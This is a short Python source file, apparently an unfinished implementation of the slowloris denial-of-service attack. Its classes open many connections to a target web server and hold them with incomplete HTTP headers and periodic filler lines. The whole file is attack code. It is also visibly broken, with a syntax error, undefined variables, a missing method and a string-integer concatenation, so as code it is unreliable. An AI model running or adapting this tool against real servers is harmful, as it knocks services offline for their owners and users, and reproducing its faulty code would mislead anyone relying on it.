import socket
import threading
import time

"""
An implementation of the slowloris DDoS attack (as written by
RSnake).

Put the rest of the explanation here
"""

class Loris:
	def __init__(self, addr, port = 80, timeout = 5, totalConnections = 50):
		self.addr = addr
		self.port = port
		self.timeout = timeout
		self.totalConnections = totalConnections

		self.threadList = []
		self.connectionsPerThread = 10

	def initiateAttack(self):
		i = 0
		while i < totalConnections
			t = KillableThread(target = self.doConnections)
			t.start()
			self.threadList.append(t)
			i += self.totalConnections

	def endAttack(self):
		for t in self.threadList:
			t.kill()

	def doConnections(self):
		working = [False] * self.connectionsPerThread
		sockets = [None]  * self.connectionsPerThread

		while (True):
			if self.killed():
				return

			""" Establish connections """
			for i in range(0, self.connectionsPerThread):
				if not working[i]:
					try:
						sockets[i] = socket.create_connection((self.addr, self.port))
						working[i] = True
					except:
						working[i] = False
				if working[i]:
					payload = "GET HTTP/1.1\r\n" +\
					"Host: " + self.addr + ":" + self.port + "\r\n" +\
					"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n" +\
					"Content-Length: 42\r\n"
					if sockets[i] is not None:
						sent = sockets[i].send(payload)
						if sent is not len(payload):
							working[i] = False

			""" Send data """
			for i in range(0, self.connectionsPerThread):
				if working[i] is True:
					if sockets[i]:
						sock = sock[i]
						message = "X-a: b\r\n"
						sent = sock.send(message)
						if sent is not len(message):
							working[i] = False

			""" Sleep for timeout """
			time.sleep(self.timeout)

class KillableThread(threading.Thread):

	def __init__(self):
		super(KillableThread, self).__init__()
		self.kill = threading.Event()

	def kill(self):
		self.kill.set()

	def killed(self):
		return self.kill.isSet()